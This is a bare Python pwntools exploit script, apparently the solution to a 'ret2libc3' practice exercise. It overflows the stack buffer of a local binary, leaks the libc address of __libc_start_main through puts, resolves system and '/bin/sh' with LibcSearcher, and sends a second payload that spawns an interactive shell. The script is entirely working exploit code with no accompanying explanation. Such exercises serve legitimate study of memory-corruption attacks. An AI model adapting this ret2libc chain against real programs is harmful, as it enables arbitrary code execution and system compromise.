from pwn import *
from LibcSearcher import LibcSearcher

elf = ELF('ret2libc3')
io = process(elf.path)

#gdb.attach(io,"b * 0x080486bf")
puts_addr = elf.plt['puts']
print('puts_plt addr:',hex(puts_addr))
libc_start_main_got_addr = elf.got['__libc_start_main']
print('__libc_start_main addr:',hex(libc_start_main_got_addr))
main_addr = elf.symbols['main']
print('main addr:',hex(main_addr))

print("1. leak libc_start_main_got addr and return to main again")

payload = flat([112*'a',puts_addr,'bbbb',libc_start_main_got_addr])
io.sendlineafter('Can you find it !?', payload)
libc_start_main_addr = u32(io.recv()[0:4])
print("libc_start_main addr:",hex(libc_start_main_addr))

print("2. get system and /bin/sh addr.")
libc = LibcSearcher('__libc_start_main', libc_start_main_addr)
libcbase = libc_start_main_addr - libc.dump('__libc_start_main')
system_addr = libcbase + libc.dump('system')
print('system addr:',system_addr)
binsh_addr = libcbase + libc.dump('str_bin_sh')
print('/bin/sh string addr:',binsh_addr)

print("3. get shell")

payload = flat(['a' * 104, system_addr, 'bbbb', binsh_addr])
io.sendline(payload)
io.interactive()
